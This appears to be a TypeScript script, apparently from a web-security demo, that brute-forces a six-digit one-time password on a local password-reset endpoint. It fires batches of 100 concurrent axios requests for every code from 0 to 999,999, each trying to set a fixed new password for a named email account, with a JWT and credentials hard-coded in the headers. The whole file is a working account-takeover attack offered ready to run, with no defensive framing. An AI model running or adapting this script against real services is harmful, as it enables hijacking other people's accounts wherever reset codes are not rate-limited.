import axios from "axios";

async function sendRequest(otp: string) {
  let data = JSON.stringify({
    "email": "harkirat@gmail.com",
    "otp": otp,
    "newPassword": "123123123"
  });

  let config = {
    method: "post",
    maxBodyLength: Infinity,
    url: "http://localhost:3000/reset-password",
    headers: {
      Authorization:
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjI1MmY0NzAxLWNkMzYtNDY5ZC1hNTI5LTVkM2Q5YjNjYzE2MiJ9.VnyDvrTe9EMSEX0LnOqq3bAhNocO5DzIiJoxT5U5gpY",
      email: "aman@gmail.com",
      password: "123456789",
      "Content-Type": "application/json",
    },
    data: data,
  };

  try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {
    // console.log(e);
  }
}

async function main() {
    for (let i = 0; i < 1000000; i+=100) {
      const promises = [];
      console.log("here for " + i);
      for (let j = 0; j < 100; j++) {
        promises.push(sendRequest((i + j).toString()))
      }
      await Promise.all(promises);
    }
  }
  
  main()